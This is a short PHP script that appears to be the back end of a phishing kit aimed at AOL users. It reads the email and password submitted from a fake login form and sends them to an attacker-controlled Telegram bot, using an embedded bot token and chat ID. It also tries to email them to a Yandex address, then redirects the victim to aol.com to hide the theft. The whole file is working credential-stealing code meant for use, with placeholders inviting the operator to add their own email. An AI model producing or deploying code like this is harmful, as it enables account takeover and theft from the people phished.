<?php


$formcontent="-------------xLs|log-----------------------\r\n".
"Email: ".$_POST['im']."\r\n".
"Password: ".$_POST['pm']."\r\n".
"-------------Design@Defcon-----------------------\r\n";


//input your email//

$send = "inputyouremail@yandex.com";

$subject = "xLs logs";

$headers = "From: aolproxipoke@website.usa.com>";


$token = 'bot'.'5534883626:AAF8gt8vx0XzvRbnnhshE0T6hfdem1Kfu0M'; ///type it instead of TYPEHERE
$chatid = '5651148284';

$msg = $formcontent;
$send = ['chat_id'=>$chatid,'text'=>$msg];
$web_telegram = "https://api.telegram.org/{$token}";
$ch = curl_init($web_telegram . '/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

if (!ini_get("safe_mode")) $success = @mail($send,$subject,$formcontent,$headers);

//mail($recipient, $subject, $formcontent, $headers);
?>
<html>
    
   <meta http-equiv="refresh" content="0; url=https://www.aol.com">
   
</html>